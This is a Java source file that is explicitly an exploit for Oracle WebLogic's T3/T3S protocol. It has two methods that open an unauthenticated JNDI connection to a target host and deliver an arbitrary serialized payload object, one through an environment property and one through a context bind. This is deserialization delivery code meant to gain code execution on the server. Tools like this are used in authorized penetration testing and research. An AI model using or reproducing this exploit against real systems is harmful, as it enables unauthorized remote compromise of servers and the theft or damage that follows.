package bort.millipede.wlt3;

import java.util.Hashtable;
import javax.naming.Context;
import javax.naming.InitialContext;

public class ContextExploit {
	public static void runPropertyExploit(Object payload,String host,int port,boolean t3s) {
		String protocol = "t3";
		if(t3s) protocol = "t3s";
		
		//set connection properties
		Hashtable<String,Object> env = new Hashtable<String,Object>();
		env.put("java.naming.factory.initial","weblogic.jndi.WLInitialContextFactory");
		env.put("java.naming.provider.url",protocol+"://"+host+":"+Integer.toString(port));
		//env.put("java.naming.security.principal","user");
		//env.put("java.naming.security.credentials","password");
		env.put("Prune_Tracy"+System.nanoTime(),payload); //environment property-based exploitation

		Context ctx = null;
		try {
			ctx = new InitialContext(env);
			ctx.bind("pwned"+System.nanoTime(),protocol);
		}
		catch (Exception e) {
			e.printStackTrace();
		}
		finally {
			try {
				ctx.close();
			}
			catch (Exception e) {
				//don't care
			}
		}
	}
	
	public static void runBindExploit(Object payload,String host,int port,boolean t3s) {
		String protocol = "t3";
		if(t3s) protocol = "t3s";
		
		//set connection properties
		Hashtable<String,Object> env = new Hashtable<String,Object>();
		env.put("java.naming.factory.initial","weblogic.jndi.WLInitialContextFactory");
		env.put("java.naming.provider.url",protocol+"://"+host+":"+Integer.toString(port));
		//env.put("java.naming.security.principal","user");
		//env.put("java.naming.security.credentials","password");

		Context ctx = null;
		try {
			ctx = new InitialContext(env);
			ctx.bind("Check_For_Millipedes"+System.nanoTime(),payload); //context bind-based exploitation
		}
		catch (Exception e) {
			e.printStackTrace();
		}
		finally {
			try {
				ctx.close();
			}
			catch (Exception e) {
				//don't care
			}
		}
	}
}
